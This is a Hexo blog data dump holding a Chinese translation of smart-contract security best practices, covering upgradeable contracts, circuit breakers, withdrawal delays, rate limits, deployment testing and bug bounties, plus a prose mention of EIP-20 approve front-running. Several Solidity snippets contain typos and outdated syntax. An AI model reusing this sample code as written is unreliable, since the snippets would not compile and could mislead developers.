href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\" target=\"_blank\" rel=\"noopener\">EIP20</a></li>\n<li><a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-721.md\" target=\"_blank\" rel=\"noopener\">EIP721</a>（不可替代的 token）</li>\n</ul>\n<h3 id=\"注意-EIP-20-的前期攻击\"><a href=\"#注意-EIP-20-的前期攻击\" class=\"headerlink\" title=\"注意 EIP-20 的前期攻击\"></a>注意 EIP-20 的前期攻击</h3><p>EIP-20 的 token 的 <code>approve()</code> 函数可能会让第三方提币量超过设置的预定数量。一个 <a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#transaction-ordering-dependence-tod-front-running\" target=\"_blank\" rel=\"noopener\">前期攻击</a> 可以使得一个经过授权的用户不论是在调用方法 <code>approve()</code> 之前还是之后都可以调用 <code>transferFrom()</code> 函数。更多细节可见 <a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md#approve\" target=\"_blank\" rel=\"noopener\">EIP</a> 和 <a href=\"https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit\" target=\"_blank\" rel=\"noopener\">此文档</a>。</p>\n<h3 id=\"防止将-token-转到地址-0x0\"><a href=\"#防止将-token-转到地址-0x0\" class=\"headerlink\" title=\"防止将 token 转到地址 0x0\"></a>防止将 token 转到地址 0x0</h3><p>在写本文的此刻，“零”地址（<a href=\"https://etherscan.io/address/0x0000000000000000000000000000000000000000\" target=\"_blank\" rel=\"noopener\">0x0000000000000000000000000000000000000000</a>）所拥有的 token 的价值超过了 8000,000 美元。</p>\n<h3 id=\"防止将-token-转到合约地址\"><a href=\"#防止将-token-转到合约地址\" class=\"headerlink\" title=\"防止将 token 转到合约地址\"></a>防止将 token 转到合约地址</h3><p>注意不要将 token 转到和智能合约地址相同的地址。</p>\n<p>该情况下损失的一个例子就是 EOS token 的智能合约地址中有超过 90000 个 token。</p>\n<p><strong>例子：</strong></p>\n<p>实现上面的这些推荐的一个例子会创建下面这个修饰器，验证 <code>to</code> 地址不会是 0x0 也不会是该 token 自己的合约地址：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier validDestination(address to) &#123;</span><br><span class=\"line\">\trequire(to != address(0x0));</span><br><span class=\"line\">\trequire(to != address(this));</span><br><span class=\"line\">\t_;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>该修饰器被添加到 <code>transfer</code> 和 <code>transferFrom</code> 方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function transfer(address _to, uint _value) validDestination(_to) returns (bool) &#123;</span><br><span class=\"line\">\t//some code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function transferFrom(address _from, address _to, uint _value) validDestination(_to) returns (bool) &#123;</span><br><span class=\"line\">\t//some code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"智能合约最佳实践翻译四","comments":0,"date":"2018-03-23T03:38:06.000Z","img":null,"_content":"\n## [软件工程技术](https://consensys.github.io/smart-contract-best-practices/software_engineering/)\n\n如我们在[常规理念](https://consensys.github.io/smart-contract-best-practices/software_engineering/#general-philosophy)中讨论的一样，其不足以保护你来抵御已知的攻击。由于区块链上的失败成本可能非常高，因此您还必须调整自己编写软件的方式，以解决该风险。\n\n我们主张的方式是 “做好失败的准备”。不可能提前知道你的代码是否安全。但是，你可以以使其能够优雅地失败并且损失最小的方式来构建你的合约。本部分提出了多种技术来帮助你为失败做好准备。\n\n注意：当你新增一个组件到你的系统中时，总是伴随着一定的风险。一个不好的防故障设计本身可能会成为一个漏洞 - 当它与大量优秀的防故障设计交互时。请仔细考虑你在合约中使用的每种技术，并仔细考虑它们是如何协同合作以创建一个健壮的系统。\n\n### 改进被破坏的合约\n\n当错误发生或者需要做升级的时候，代码会需要被更改。当发现一个 bug 却无法处理的时候，十分糟糕。\n\n为智能合约设计一个有效的改进系统是一个十分活跃的研究领域，而我们不会覆盖本文档中的所有难题。但是，存在两种最常用的基本方法。其中更简单的一种是使用一个注册合约来持有最新版本合约的地址。对于合约用户来说，更连贯的方法是拥有一份可以将调用和数据转发到合约的最新版本的合约。\n\n不管是什么技术，模块化和组件间良好的分离是十分重要的，这样代码的修改就不会破坏功能，独立的数据，或者需要大量成本来移植。尤其是将复杂的逻辑从你的数据存储分离通常是有益的，这样你就不需要为了修改功能而重新创建所有的数据。\n\n提供一种安全的方式可以让多方去决定升级代码也十分重要。由你的合约决定，代码修改被通过的前提是只需要一方可信的，一个团队，或者是所有股东的投票才可以。如果这个过程需要一些时间，你需要考虑是否有其他方法可以在发生攻击时迅速做出反应，如[紧急停止或者是熔断机制](https://github.com/ConsenSys/smart-contract-best-practices/#circuit-breakers-pause-contract-functionality)。\n\n**示例 1:使用一个注册合约来存储另一个合约的最新版本**\n\n在这个例子中，调用不会被发送，所以用户应该在每一次与合约交互之前都获取一下当前的地址。\n```\ncontract SomeRegister {\n\taddress backendContract;\n\taddress[] previousBackends;\n\taddress owner;\n\n\tfunction SomeRegister() {\n\t\towner = msg.sender;\n\t}\n\n\tmodifier onlyOwner() {\n\t\trequire(msg.sender == owner)\n\t\t_;\n\t}\n\n\tfunction changeBackend(address newBackend) public onlyOwner() returns (bool) {\n\t\tif (newBackend != backendContract) {\n\t\t\tpreviousBackend.push(backendContract);\n\t\t\tbackendContract = newBackend;\n\t\t\treturn true;\n\t\t}\n\n\t\treturn false;\n\t}\n}\n```\n\n这个方法有两个缺点：\n\n1. 用户必须总是检查当前的地址，如果不这么做就有使用旧版本合约的风险。\n2. 你需要在替换合约的时候小心的思考如果处理合约内的数据。\n\n另一种方法是让合约将调用和数据转发给合约的最新版本：\n\n**示例 2：[使用 `DELEGATECALL`](http://ethereum.stackexchange.com/questions/2404/upgradeable-contracts) 来转发数据和调用**\n```\ncontract Relay　{\n\taddress public currentVersion;\n\taddress public owner;\n\n\tmodifier onlyOwner() {\n\t\trequire(msg.sender == owner);\n\t\t_;\n\t}\n\n\tfunction Relay(address initAddr) {\n\t\tcurrentVersion = initAddr;\n\t\towner = msg.sender; // this owner may be another contract with multisig, not a single contract owner\n\t}\n\n\tfunction changeContract(address newVersion) public onlyOwner() {\n\t\tcurrentVersion = newVersion;\n\t}\n\n\tfunction() {\n\t\trequire(currentVersion.delegatecall(msg.data));\n\t}\n}\n```\n\n这个方式避免了之前的问题，但他本身又存在问题。在这个合约中存储数据的时候你必须极度小心。如果你的新合约和第一个的存储结构不同，你的数据可能会被破坏。另外，这种模式的简单版本不会从函数返回值，只会转发他们，这限制了它的适用性。（[更复杂的实现方式](https://github.com/ownage-ltd/ether-router)则是试图通过内联汇编代码和返回大小的注册表来解决这个问题。）\n\n不管你的方法是什么，重要的是要有某种方法来升级你的合约，否则当不可避免的错误被发现时，它们将变得无法使用。\n\n### 断路器（暂停合约功能）\n\n当触发了确定的条件，断路器会停止当前的执行，而对于新发现的错误，它也十分有用。举例来说，如果发现了错误，合约中除了提币操作，其他大多数操作可能都会暂停。你既可以给某些可信的一方触发断路器的能力，也可以设定在某些条件满足时自动触发某些断路器的程序规则。\n\n例如:\n```\nbool private stopped = false;\naddress private owner;\n\nmodifier isAdmin() {\n\trequire(msg.sender == owner);\n\t_;\n}\n\nfunction toggleContractActive() isAdmin public {\n\t// You can add an additional modifier that restricts stopping a contract to be based on another action, such as a vote of users\n\tstopped = !stopped;\n}\n\nmodifier stopInEmergency {if (!stopped) _;}\nmodifier onlyInEmergency {if（stopped）_;}\n\nfunction deposit() stopInEmergency public {\n\t// some code\n}\n\nfunction withdraw() onlyInEmergency public {\n\t// some code\n}\n```\n\n### 速度碰撞（延迟合约动作）\n\n速度碰撞使得动作变慢，所以如果发生了恶意的动作，就有时间来恢复了。举例来说，[The DAO](https://github.com/slockit/DAO/)在一个拆分 DAO 的成功请求和完成该请求之间需要 27 天的时间。这保证了资金被保存在合约内，增加了恢复的可能性。在 DAO 这个例子中，在速度碰撞期间内无法采取有效的行动，但是与其他技术相结合，这就相当有效了。\n\n例子：\n```\nstruct RequestedWithdrawal {\n\tuint amount;\n\tuint time;\n}\n\nmapping(address => uint) private balances;\nmapping(address => RequestedWithdrawal) private requestedWithdrawals\nuint constant withdrawalWaitPeriod = 28 days; // 4 weeks\n\nfunction requestWithdrawal() public {\n\t if (balances[msg.sender] > 0) {\n\t \tuint amountToWithdraw = balances[msg.sender];\n\t \tbalances[msg.sender] = 0;\n\n\t \trequestedWithdrawals[msg.sender] = RequestedWithdrawal({\n\t \t\tamount: amountToWithdraw,\n\t \t\ttime: now\n\t \t\t});\n\t }\n}\n\nfunction withdraw() public {\n\tif(requestedWithdrawals[msg.sender].amount > 0 && now > requestedWithdrawals[msg.sender].time + withdrawalWaitPeriod) {\n\t\tuint amountToWithdraw = requestedWithdrawals[msg.sender].amount;\n\t\trequestedWithdrawals[msg.sender].amount = 0;\n\n\t\trequire(msg.sender.send(amountToWithdraw));\n\t}\n}\n```\n\n### 比例限制\n\n比例限制停止或要求实质性变更的通过。举例来说，一个存款人在一定时期内只允许提取一定数量或一定百分比的存款（如 一天最多 100 ether）- 另外在该时期内的提币将会失败或者需要一些特殊的审批通过。或者比例限制可以通过在该时期内合约只能提取一定的 token 的形式在合约层面实现。\n\n例子：\n```\ncontract CircuitBreaker {\n\tstruct Transfer {\n\t\tuint amount;\n\t\taddress to;\n\t\tuint releaseBlock;\n\t\tbool released;\n\t\tbool stopped;\n\t}\n\n\tTransfer[] public transfers;\n\n\taddress public curator;\n\taddress public authorizedSender;\n\tuint public period;\n\tuint public limit;\n\n\tuint public currentPeriodEnd;\n\tuint public currentPeriodAmount;\n\n\tevent PendingTransfer(uint id, uint amount, address to, uint releaseBlock);\n\n\tfunction CircuitBreaker(address _curator, address _authorizedSender, uint _period, uint _limit) {\n\t\tcurator = _curator;\n\t\tperiod = _period;\n\t\tlimit = _limit;\n\t\tauthorizedSender = _authorizedSender;\n\t\tcurrentPeriodEnd = block.number + period;\n\t}\n\n\tfunction transfer(uint amount, address to) {\n\t\tif (msg.sender == authorizedSender) {\n\t\t\tupdatePeriod();\n\n\t\t\tif (currentPeriodAmount + amount > limit) {\n\t\t\t\tuint releaseBlock = block.number + period;\n\t\t\t\tPendingTransfer(transfer.length, amount, to, releaseBlock);\n\t\t\t\ttransfer.push(Transfer(amount, to, releaseBlock, false, false));\n\t\t\t} else {\n\t\t\t\tcurrentPeriodAmount += amount;\n\t\t\t\ttransfers.push(Transfer(amount, to, block.number, true, false));\n\t\t\t\tif (!to.sender(amount)) throw;\n\t\t\t}\n\t\t}\n\t}\n\n\tfunction updatePeriod() {\n\t\tif (currentPeriodEnd < block.number) {\n\t\t\tcurrentPeriodEnd = block.number + period;\n\t\t\tcurrentPeriodAmount = 0;\n\t\t}\n\t}\n\n\tfunction releasePendingTransfer(uint id) {\n\t\tTransfer transfer = transfers[id];\n\t\tif (transfer.releaseBlock <= block.number && !transfer.released && !transfer.stopped) {\n\t\t\ttransfer.released = true;\n\t\t\tif (!transfer.to.send(transfer.amount)) throw;\n\t\t}\n\t}\n\n\tfunction stopTransfer(uint id) {\n\t\tif (msg.sender == curator) {\n\t\t\ttransfer[id].stopped = true;\n\t\t}\n\t}\n\n\n}\n```\n\n### 合约部署\n\n在资金处于危险之前，合约应该有大量的长期的测试阶段。\n\n最小程度，你应该：\n\n* 有一个完整的测试套件，覆盖了 100%（或者接近） 的测试。\n* 部署在你自己的测试网络上。\n* 经过大量的测试之后才能发布在公共测试网络上，并且要发布 bug 悬赏。\n* 详尽的测试应该包括大量不同的玩家同时与合约交互。\n* 将 beta 版本部署在主网上，降低风险。\n\n\n##### 自动防护\n\n在测试期，你可以设置在一定时期之后自动反对来防止任何的操作。举例来说，一个 alpha 版本的合约在工作几周之后会自动关闭所有的操作，除了最终的提币。\n```\nmodifier isActive() {\n\trequrie(block.number <= SOME_BLOCK_NUMBER);\n\t_;\n}\n\nfunction deposit() public isActive {\n\t// some code\n}\n\nfunction withdraw() public {\n\t// some code\n}\n```\n\n##### 限制每个用户/合约的 ETH 数量\n\n在早期阶段，你可以限制任何用户（或者整个合约）的 ETH 数量来降低风险。\n\n### bug 悬赏计划\n\n一些悬赏计划的技巧：\n\n* 决定奖励哪些货币（BTC 或者 ETH）\n* 决定悬赏的总预算\n* 从预算中确定三层奖励：\n* 你愿意付出的最小奖励\n* 最高的奖励是可以常常被获得的\n* 如果存在非常严重的漏洞，将额外给予的奖励范围\n* 确定赏金评委是谁（3人可能是典型的理想人选）\n* 首席开发者可能应该是赏金评委之一\n* 当收到错误报告时，首席开发人员应该根据评委的建议评估错误的严重程度\n* 在这个阶段的工作应该是在一个私有仓库，并归档在 Github 上提出的问题\n* 如果这是一个应该修复的 bug，那么在私有仓库中，开发人员应该编写一个测试用例，这个用例应该会失败，从而确认 bug\n* 开发人员应该执行修复程序并确保测试通过; 根据需要编写额外的测试\n* 给赏金猎人展示修复工作; 将修复合并入公共仓库是一种方法\n* 确定赏金猎人是否有任何其他有关修复的反馈\n* 赏金评委根据他们对 bug 的 *可能性* 和 *影响* 的评估来确定奖励的大小\n* 在整个过程中保持奖励参与者的信息，然后努力避免延误向他们发送奖励\n\n有关三种奖励的例子，请参阅[以太坊的赏金计划](https://bounty.ethereum.org/)：\n>支付的奖励价值取决于影响的严重程度。 对轻微“无害”错误的奖励最少 0.05 BTC。例如，导致共识问题的错误将奖励高达 5 BTC。 如果存在非常严重的漏洞，可能获得更高的奖励（高达 25 BTC）。\n\n","source":"_posts/智能合约最佳实践翻译四.md","raw":"---\ntitle: 智能合约最佳实践翻译四\ncomments: false\ndate: 2018-03-23 11:38:06\ncategories: 区块链\ntags: \n- ZhouFyk\n- 以太坊\n- 智能合约\nimg:\n---\n\n## [软件工程技术](https://consensys.github.io/smart-contract-best-practices/software_engineering/)\n\n如我们在[常规理念](https://consensys.github.io/smart-contract-best-practices/software_engineering/#general-philosophy)中讨论的一样，其不足以保护你来抵御已知的攻击。由于区块链上的失败成本可能非常高，因此您还必须调整自己编写软件的方式，以解决该风险。\n\n我们主张的方式是 “做好失败的准备”。不可能提前知道你的代码是否安全。但是，你可以以使其能够优雅地失败并且损失最小的方式来构建你的合约。本部分提出了多种技术来帮助你为失败做好准备。\n\n注意：当你新增一个组件到你的系统中时，总是伴随着一定的风险。一个不好的防故障设计本身可能会成为一个漏洞 - 当它与大量优秀的防故障设计交互时。请仔细考虑你在合约中使用的每种技术，并仔细考虑它们是如何协同合作以创建一个健壮的系统。\n\n### 改进被破坏的合约\n\n当错误发生或者需要做升级的时候，代码会需要被更改。当发现一个 bug 却无法处理的时候，十分糟糕。\n\n为智能合约设计一个有效的改进系统是一个十分活跃的研究领域，而我们不会覆盖本文档中的所有难题。但是，存在两种最常用的基本方法。其中更简单的一种是使用一个注册合约来持有最新版本合约的地址。对于合约用户来说，更连贯的方法是拥有一份可以将调用和数据转发到合约的最新版本的合约。\n\n不管是什么技术，模块化和组件间良好的分离是十分重要的，这样代码的修改就不会破坏功能，独立的数据，或者需要大量成本来移植。尤其是将复杂的逻辑从你的数据存储分离通常是有益的，这样你就不需要为了修改功能而重新创建所有的数据。\n\n提供一种安全的方式可以让多方去决定升级代码也十分重要。由你的合约决定，代码修改被通过的前提是只需要一方可信的，一个团队，或者是所有股东的投票才可以。如果这个过程需要一些时间，你需要考虑是否有其他方法可以在发生攻击时迅速做出反应，如[紧急停止或者是熔断机制](https://github.com/ConsenSys/smart-contract-best-practices/#circuit-breakers-pause-contract-functionality)。\n\n**示例 1:使用一个注册合约来存储另一个合约的最新版本**\n\n在这个例子中，调用不会被发送，所以用户应该在每一次与合约交互之前都获取一下当前的地址。\n```\ncontract SomeRegister {\n\taddress backendContract;\n\taddress[] previousBackends;\n\taddress owner;\n\n\tfunction SomeRegister() {\n\t\towner = msg.sender;\n\t}\n\n\tmodifier onlyOwner() {\n\t\trequire(msg.sender == owner)\n\t\t_;\n\t}\n\n\tfunction changeBackend(address newBackend) public onlyOwner() returns (bool) {\n\t\tif (newBackend != backendContract) {\n\t\t\tpreviousBackend.push(backendContract);\n\t\t\tbackendContract = newBackend;\n\t\t\treturn true;\n\t\t}\n\n\t\treturn false;\n\t}\n}\n```\n\n这个方法有两个缺点：\n\n1. 用户必须总是检查当前的地址，如果不这么做就有使用旧版本合约的风险。\n2. 你需要在替换合约的时候小心的思考如果处理合约内的数据。\n\n另一种方法是让合约将调用和数据转发给合约的最新版本：\n\n**示例 2：[使用 `DELEGATECALL`](http://ethereum.stackexchange.com/questions/2404/upgradeable-contracts) 来转发数据和调用**\n```\ncontract Relay　{\n\taddress public currentVersion;\n\taddress public owner;\n\n\tmodifier onlyOwner() {\n\t\trequire(msg.sender == owner);\n\t\t_;\n\t}\n\n\tfunction Relay(address initAddr) {\n\t\tcurrentVersion = initAddr;\n\t\towner = msg.sender; // this owner may be another contract with multisig, not a single contract owner\n\t}\n\n\tfunction changeContract(address newVersion) public onlyOwner() {\n\t\tcurrentVersion = newVersion;\n\t}\n\n\tfunction() {\n\t\trequire(currentVersion.delegatecall(msg.data));\n\t}\n}\n```\n\n这个方式避免了之前的问题，但他本身又存在问题。在这个合约中存储数据的时候你必须极度小心。如果你的新合约和第一个的存储结构不同，你的数据可能会被破坏。另外，这种模式的简单版本不会从函数返回值，只会转发他们，这限制了它的适用性。（[更复杂的实现方式](https://github.com/ownage-ltd/ether-router)则是试图通过内联汇编代码和返回大小的注册表来解决这个问题。）\n\n不管你的方法是什么，重要的是要有某种方法来升级你的合约，否则当不可避免的错误被发现时，它们将变得无法使用。\n\n### 断路器（暂停合约功能）\n\n当触发了确定的条件，断路器会停止当前的执行，而对于新发现的错误，它也十分有用。举例来说，如果发现了错误，合约中除了提币操作，其他大多数操作可能都会暂停。你既可以给某些可信的一方触发断路器的能力，也可以设定在某些条件满足时自动触发某些断路器的程序规则。\n\n例如:\n```\nbool private stopped = false;\naddress private owner;\n\nmodifier isAdmin() {\n\trequire(msg.sender == owner);\n\t_;\n}\n\nfunction toggleContractActive() isAdmin public {\n\t// You can add an additional modifier that restricts stopping a contract to be based on another action, such as a vote of users\n\tstopped = !stopped;\n}\n\nmodifier stopInEmergency {if (!stopped) _;}\nmodifier onlyInEmergency {if（stopped）_;}\n\nfunction deposit() stopInEmergency public {\n\t// some code\n}\n\nfunction withdraw() onlyInEmergency public {\n\t// some code\n}\n```\n\n### 速度碰撞（延迟合约动作）\n\n速度碰撞使得动作变慢，所以如果发生了恶意的动作，就有时间来恢复了。举例来说，[The DAO](https://github.com/slockit/DAO/)在一个拆分 DAO 的成功请求和完成该请求之间需要 27 天的时间。这保证了资金被保存在合约内，增加了恢复的可能性。在 DAO 这个例子中，在速度碰撞期间内无法采取有效的行动，但是与其他技术相结合，这就相当有效了。\n\n例子：\n```\nstruct RequestedWithdrawal {\n\tuint amount;\n\tuint time;\n}\n\nmapping(address => uint) private balances;\nmapping(address => RequestedWithdrawal) private requestedWithdrawals\nuint constant withdrawalWaitPeriod = 28 days; // 4 weeks\n\nfunction requestWithdrawal() public {\n\t if (balances[msg.sender] > 0) {\n\t \tuint amountToWithdraw = balances[msg.sender];\n\t \tbalances[msg.sender] = 0;\n\n\t \trequestedWithdrawals[msg.sender] = RequestedWithdrawal({\n\t \t\tamount: amountToWithdraw,\n\t \t\ttime: now\n\t \t\t});\n\t }\n}\n\nfunction withdraw() public {\n\tif(requestedWithdrawals[msg.sender].amount > 0 && now > requestedWithdrawals[msg.sender].time + withdrawalWaitPeriod) {\n\t\tuint amountToWithdraw = requestedWithdrawals[msg.sender].amount;\n\t\trequestedWithdrawals[msg.sender].amount = 0;\n\n\t\trequire(msg.sender.send(amountToWithdraw));\n\t}\n}\n```\n\n### 比例限制\n\n比例限制停止或要求实质性变更的通过。举例来说，一个存款人在一定时期内只允许提取一定数量或一定百分比的存款（如 一天最多 100 ether）- 另外在该时期内的提币将会失败或者需要一些特殊的审批通过。或者比例限制可以通过在该时期内合约只能提取一定的 token 的形式在合约层面实现。\n\n例子：\n```\ncontract CircuitBreaker {\n\tstruct Transfer {\n\t\tuint amount;\n\t\taddress to;\n\t\tuint releaseBlock;\n\t\tbool released;\n\t\tbool stopped;\n\t}\n\n\tTransfer[] public transfers;\n\n\taddress public curator;\n\taddress public authorizedSender;\n\tuint public period;\n\tuint public limit;\n\n\tuint public currentPeriodEnd;\n\tuint public currentPeriodAmount;\n\n\tevent PendingTransfer(uint id, uint amount, address to, uint releaseBlock);\n\n\tfunction CircuitBreaker(address _curator, address _authorizedSender, uint _period, uint _limit) {\n\t\tcurator = _curator;\n\t\tperiod = _period;\n\t\tlimit = _limit;\n\t\tauthorizedSender = _authorizedSender;\n\t\tcurrentPeriodEnd = block.number + period;\n\t}\n\n\tfunction transfer(uint amount, address to) {\n\t\tif (msg.sender == authorizedSender) {\n\t\t\tupdatePeriod();\n\n\t\t\tif (currentPeriodAmount + amount > limit) {\n\t\t\t\tuint releaseBlock = block.number + period;\n\t\t\t\tPendingTransfer(transfer.length, amount, to, releaseBlock);\n\t\t\t\ttransfer.push(Transfer(amount, to, releaseBlock, false, false));\n\t\t\t} else {\n\t\t\t\tcurrentPeriodAmount += amount;\n\t\t\t\ttransfers.push(Transfer(amount, to, block.number, true, false));\n\t\t\t\tif (!to.sender(amount)) throw;\n\t\t\t}\n\t\t}\n\t}\n\n\tfunction updatePeriod() {\n\t\tif (currentPeriodEnd < block.number) {\n\t\t\tcurrentPeriodEnd = block.number + period;\n\t\t\tcurrentPeriodAmount = 0;\n\t\t}\n\t}\n\n\tfunction releasePendingTransfer(uint id) {\n\t\tTransfer transfer = transfers[id];\n\t\tif (transfer.releaseBlock <= block.number && !transfer.released && !transfer.stopped) {\n\t\t\ttransfer.released = true;\n\t\t\tif (!transfer.to.send(transfer.amount)) throw;\n\t\t}\n\t}\n\n\tfunction stopTransfer(uint id) {\n\t\tif (msg.sender == curator) {\n\t\t\ttransfer[id].stopped = true;\n\t\t}\n\t}\n\n\n}\n```\n\n### 合约部署\n\n在资金处于危险之前，合约应该有大量的长期的测试阶段。\n\n最小程度，你应该：\n\n* 有一个完整的测试套件，覆盖了 100%（或者接近） 的测试。\n* 部署在你自己的测试网络上。\n* 经过大量的测试之后才能发布在公共测试网络上，并且要发布 bug 悬赏。\n* 详尽的测试应该包括大量不同的玩家同时与合约交互。\n* 将 beta 版本部署在主网上，降低风险。\n\n\n##### 自动防护\n\n在测试期，你可以设置在一定时期之后自动反对来防止任何的操作。举例来说，一个 alpha 版本的合约在工作几周之后会自动关闭所有的操作，除了最终的提币。\n```\nmodifier isActive() {\n\trequrie(block.number <= SOME_BLOCK_NUMBER);\n\t_;\n}\n\nfunction deposit() public isActive {\n\t// some code\n}\n\nfunction withdraw() public {\n\t// some code\n}\n```\n\n##### 限制每个用户/合约的 ETH 数量\n\n在早期阶段，你可以限制任何用户（或者整个合约）的 ETH 数量来降低风险。\n\n### bug 悬赏计划\n\n一些悬赏计划的技巧：\n\n* 决定奖励哪些货币（BTC 或者 ETH）\n* 决定悬赏的总预算\n* 从预算中确定三层奖励：\n* 你愿意付出的最小奖励\n* 最高的奖励是可以常常被获得的\n* 如果存在非常严重的漏洞，将额外给予的奖励范围\n* 确定赏金评委是谁（3人可能是典型的理想人选）\n* 首席开发者可能应该是赏金评委之一\n* 当收到错误报告时，首席开发人员应该根据评委的建议评估错误的严重程度\n* 在这个阶段的工作应该是在一个私有仓库，并归档在 Github 上提出的问题\n* 如果这是一个应该修复的 bug，那么在私有仓库中，开发人员应该编写一个测试用例，这个用例应该会失败，从而确认 bug\n* 开发人员应该执行修复程序并确保测试通过; 根据需要编写额外的测试\n* 给赏金猎人展示修复工作; 将修复合并入公共仓库是一种方法\n* 确定赏金猎人是否有任何其他有关修复的反馈\n* 赏金评委根据他们对 bug 的 *可能性* 和 *影响* 的评估来确定奖励的大小\n* 在整个过程中保持奖励参与者的信息，然后努力避免延误向他们发送奖励\n\n有关三种奖励的例子，请参阅[以太坊的赏金计划](https://bounty.ethereum.org/)：\n>支付的奖励价值取决于影响的严重程度。 对轻微“无害”错误的奖励最少 0.05 BTC。例如，导致共识问题的错误将奖励高达 5 BTC。 如果存在非常严重的漏洞，可能获得更高的奖励（高达 25 BTC）。\n\n","slug":"智能合约最佳实践翻译四","published":1,"updated":"2018-03-26T04:00:17.800Z","layout":"post","photos":[],"link":"","_id":"cjf7piavx001hpkwotkedf3bu","content":"<h2 id=\"软件工程技术\"><a href=\"#软件工程技术\" class=\"headerlink\" title=\"软件工程技术\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/software_engineering/\" target=\"_blank\" rel=\"noopener\">软件工程技术</a></h2><p>如我们在<a href=\"https://consensys.github.io/smart-contract-best-practices/software_engineering/#general-philosophy\" target=\"_blank\" rel=\"noopener\">常规理念</a>中讨论的一样，其不足以保护你来抵御已知的攻击。由于区块链上的失败成本可能非常高，因此您还必须调整自己编写软件的方式，以解决该风险。</p>\n<p>我们主张的方式是 “做好失败的准备”。不可能提前知道你的代码是否安全。但是，你可以以使其能够优雅地失败并且损失最小的方式来构建你的合约。本部分提出了多种技术来帮助你为失败做好准备。</p>\n<p>注意：当你新增一个组件到你的系统中时，总是伴随着一定的风险。一个不好的防故障设计本身可能会成为一个漏洞 - 当它与大量优秀的防故障设计交互时。请仔细考虑你在合约中使用的每种技术，并仔细考虑它们是如何协同合作以创建一个健壮的系统。</p>\n<h3 id=\"改进被破坏的合约\"><a href=\"#改进被破坏的合约\" class=\"headerlink\" title=\"改进被破坏的合约\"></a>改进被破坏的合约</h3><p>当错误发生或者需要做升级的时候，代码会需要被更改。当发现一个 bug 却无法处理的时候，十分糟糕。</p>\n<p>为智能合约设计一个有效的改进系统是一个十分活跃的研究领域，而我们不会覆盖本文档中的所有难题。但是，存在两种最常用的基本方法。其中更简单的一种是使用一个注册合约来持有最新版本合约的地址。对于合约用户来说，更连贯的方法是拥有一份可以将调用和数据转发到合约的最新版本的合约。</p>\n<p>不管是什么技术，模块化和组件间良好的分离是十分重要的，这样代码的修改就不会破坏功能，独立的数据，或者需要大量成本来移植。尤其是将复杂的逻辑从你的数据存储分离通常是有益的，这样你就不需要为了修改功能而重新创建所有的数据。</p>\n<p>提供一种安全的方式可以让多方去决定升级代码也十分重要。由你的合约决定，代码修改被通过的前提是只需要一方可信的，一个团队，或者是所有股东的投票才可以。如果这个过程需要一些时间，你需要考虑是否有其他方法可以在发生攻击时迅速做出反应，如<a href=\"https://github.com/ConsenSys/smart-contract-best-practices/#circuit-breakers-pause-contract-functionality\" target=\"_blank\" rel=\"noopener\">紧急停止或者是熔断机制</a>。</p>\n<p><strong>示例 1:使用一个注册合约来存储另一个合约的最新版本</strong></p>\n<p>在这个例子中，调用不会被发送，所以用户应该在每一次与合约交互之前都获取一下当前的地址。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SomeRegister &#123;</span><br><span class=\"line\">\taddress backendContract;</span><br><span class=\"line\">\taddress[] previousBackends;</span><br><span class=\"line\">\taddress owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction SomeRegister() &#123;</span><br><span class=\"line\">\t\towner = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier onlyOwner() &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == owner)</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction changeBackend(address newBackend) public onlyOwner() returns (bool) &#123;</span><br><span class=\"line\">\t\tif (newBackend != backendContract) &#123;</span><br><span class=\"line\">\t\t\tpreviousBackend.push(backendContract);</span><br><span class=\"line\">\t\t\tbackendContract = newBackend;</span><br><span class=\"line\">\t\t\treturn true;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个方法有两个缺点：</p>\n<ol>\n<li>用户必须总是检查当前的地址，如果不这么做就有使用旧版本合约的风险。</li>\n<li>你需要在替换合约的时候小心的思考如果处理合约内的数据。</li>\n</ol>\n<p>另一种方法是让合约将调用和数据转发给合约的最新版本：</p>\n<p><strong>示例 2：<a href=\"http://ethereum.stackexchange.com/questions/2404/upgradeable-contracts\" target=\"_blank\" rel=\"noopener\">使用 <code>DELEGATECALL</code></a> 